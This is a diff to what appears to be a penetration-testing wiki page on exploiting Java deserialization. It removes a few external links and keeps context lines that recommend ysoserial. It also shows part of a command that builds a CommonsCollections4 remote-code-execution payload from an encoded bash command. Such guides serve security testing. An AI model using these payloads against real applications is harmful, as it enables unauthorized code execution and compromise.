@@ -420,7 +420,7 @@ If you find a java serialized object being sent to a web application, **you can 
 
 ### **ysoserial**
 
-The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
+The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
 Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
 I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
 
@@ -469,7 +469,7 @@ java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb
 base64 -w0 payload
 ```
 
-When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).
+When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`).
 
 Feel free to use the next script to create **all the possible code execution** payloads for Windows and Linux and then test them on the vulnerable web page:
 
@@ -661,7 +661,6 @@ ObjectInputFilter.Config.setSerialFilter(filter);
 - [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
 - [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
 - Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
-- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)
 
 ## JNDI Injection & log4Shell
 
